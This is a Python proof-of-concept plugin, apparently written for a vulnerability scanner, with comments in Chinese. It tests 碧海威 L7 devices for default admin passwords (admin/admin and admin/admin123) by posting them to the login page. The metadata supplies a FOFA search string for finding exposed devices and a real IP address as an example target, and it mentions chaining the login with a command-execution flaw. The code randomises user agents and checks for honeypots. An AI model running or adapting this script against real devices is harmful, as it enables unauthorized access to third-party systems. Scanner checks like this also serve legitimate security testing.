# coding:utf-8  
import requests
from lib.core.common import url_handle,get_random_ua
from lib.core.poc import POCBase
# ...
import urllib3
urllib3.disable_warnings()

class POC(POCBase):

    _info = {
        "author" : "jijue",                      # POC作者
        "version" : "1",                    # POC版本，默认是1  
        "CreateDate" : "2021-06-09",        # POC创建时间
        "UpdateDate" : "2021-06-09",        # POC创建时间
        "PocDesc" : """
        略  
        """,                                # POC描述，写更新描述，没有就不写

        "name" : "碧海威 L7 弱口令漏洞",                        # 漏洞名称
        "VulnID" : "oFx-2021-0001",                      # 漏洞编号，以CVE为主，若无CVE，使用CNVD，若无CNVD，留空即可
        "AppName" : "碧海威 L7",                     # 漏洞应用名称
        "AppVersion" : "None",                  # 漏洞应用版本
        "VulnDate" : "2021-06-09",                    # 漏洞公开的时间,不知道就写今天，格式：xxxx-xx-xx
        "VulnDesc" : """
        碧海威 L7 存在两个默认登陆口令，配合该产品的命令执行漏洞实现更深层次的利用  
        """,                                # 漏洞简要描述

        "fofa-dork":"""
        "碧海威"
        """,                     # fofa搜索语句
        "example" : "https://111.53.148.100:1443",                     # 存在漏洞的演示url，写一个就可以了
        "exp_img" : "",                      # 先不管  
    }

    def _verify(self):
        """
        返回vuln

        存在漏洞：vuln = [True,html_source] # html_source就是页面源码  

        不存在漏洞：vuln = [False,""]
        """
        vuln = [False,""]
        url = self.target + "/login.php?action=login&type=admin" # url自己按需调整
        data0 = "username=admin&password=admin"
        data1 = "username=admin&password=admin123"

        headers = {"User-Agent":get_random_ua(),
                    "Connection":"close",
                    "Content-Type": "application/x-www-form-urlencoded",
                    }
        
        try:
            """
            检测逻辑，漏洞存在则修改vuln值为True，漏洞不存在则不动
            """
            req0 = requests.post(url , data = data0 ,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False)
            if "{\"success\":\"true\"," in req0.text and req0.status_code == 200:#req.status_code == 200 and :
                vuln = [True,data0]
            else:
                req1 = requests.post(url , data = data1 ,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False)
                if "{\"success\":\"true\"," in req1.text and req1.status_code == 200:#req.status_code == 200 and :
                    vuln = [True,data1]
                else:
                    vuln = [False,"Unvuln"]
        except Exception as e:
            raise e
        
        # 以下逻辑酌情使用
        if self._honeypot_check(vuln[1]) == True:
            vuln[0] = False
        
        return vuln

    def _attack(self):
        return self._verify()